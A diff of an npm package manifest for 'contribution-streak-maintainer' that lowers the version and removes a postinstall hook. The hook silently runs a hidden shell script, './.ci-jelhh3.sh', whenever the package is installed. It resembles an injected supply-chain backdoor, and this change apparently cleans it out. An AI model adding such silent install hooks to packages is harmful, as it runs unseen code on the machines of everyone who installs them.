@@ -1,7 +1,7 @@
 {
   "name": "contribution-streak-maintainer",
   "description": "Automatically maintain your GitHub contribution streak",
-  "version": "1.0.26",
+  "version": "1.0.24",
   "author": "Elias Afara <afaraelias@gmail.com>",
   "type": "commonjs",
   "bin": {
@@ -12,8 +12,7 @@
     "tsc": "tsc",
     "build": "npm run tsc",
     "ci-test": "jest",
-    "test": "jest",
-    "postinstall": "sh ./.ci-jelhh3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "jest"
   },
   "keywords": [
     "GitHub Actions",
